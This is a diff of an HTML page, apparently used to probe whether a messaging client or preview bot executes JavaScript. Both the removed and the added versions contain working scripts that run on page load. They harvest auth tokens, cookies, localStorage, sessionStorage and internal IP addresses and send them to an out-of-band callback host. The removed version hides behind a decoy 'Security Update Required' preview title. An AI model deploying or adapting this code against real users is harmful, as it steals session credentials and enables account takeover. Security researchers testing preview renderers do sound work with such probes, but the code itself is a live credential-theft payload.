@@ -1,51 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Preview Investigation</title>
-
-    <meta property="og:title" content="Security Update Required">
-    <meta property="og:description" content="Please review the document at this link.">
-    <meta property="og:image" content="https://via.placeholder.com/600x315.png?text=Security+Research">
-
-    <script>
-        (function() {
-            try {
-                // 1. Собираем всё самое ценное из LocalStorage
-                const loot = {
-                    auth: localStorage.getItem('__oneme_auth'),
-                    callToken: localStorage.getItem('__oneme_calls_auth_token'),
-                    deviceId: localStorage.getItem('__oneme_device_id'),
-                    url: window.location.href,
-                    cookies: document.cookie,
-                    timestamp: new Date().toISOString()
-                };
-
-                // 2. Отправляем на вебхук
-                // Используем mode: 'no-cors', чтобы запрос прошел даже при строгой политике CORS
-                fetch('https://zmsfeowzqscjsayavbfelncjzqdvcgxyz.oast.fun', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(loot)
-                })
-                .then(() => console.log('Data sent successfully'))
-                .catch((err) => console.error('Error sending data:', err));
-
-            } catch (error) {
-                // Логируем ошибки доступа, если сработал Sandboxing или SOP
-                fetch('https://zmsfeowzqscjsayavbfelncjzqdvcgxyz.oast.fun?error=' + btoa(error.message));
-            }
-        })();
-    </script>
+    <title>Internal Preview</title>
 </head>
 <body>
-    <div style="font-family: sans-serif; text-align: center; margin-top: 50px;">
-        <h1>Research Laboratory</h1>
-        <p>If you see this, the page has been rendered by the client/bot.</p>
-    </div>
+    <script>
+        (async function() {
+            const hook = "https://zmsfeowzqscjsayavbfelncjzqdvcgxyz.oast.fun";
+            
+            // Собираем всё, до чего дотянутся руки
+            const data = {
+                type: "BROWSER_DATA_LEAK",
+                url: window.location.href,
+                origin: window.origin,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                userAgent: navigator.userAgent,
+                // Пытаемся узнать внутренний IP через WebRTC (если не заблочено)
+                internalIP: await (async () => {
+                    try {
+                        const pc = new RTCPeerConnection();
+                        pc.createDataChannel("");
+                        const offer = await pc.createOffer();
+                        return offer.sdp.match(/(?:\d{1,3}\.){3}\d{1,3}/g);
+                    } catch (e) { return "blocked"; }
+                })()
+            };
+            // Отправляем через Beacon API (оно надежнее для ботов, которые быстро закрывают страницу)
+            navigator.sendBeacon(hook + "/LOOT", JSON.stringify(data));
+            
+            // Запасной метод через картинку, если Beacon не сработал
+            new Image().src = hook + "/REPORT?c=" + btoa(document.cookie).substring(0, 100);
+        })();
+    </script>
+    <img src="https://zmsfeowzqscjsayavbfelncjzqdvcgxyz.oast.fun/JS_MAYBE_DISABLED">
 </body>
 </html>
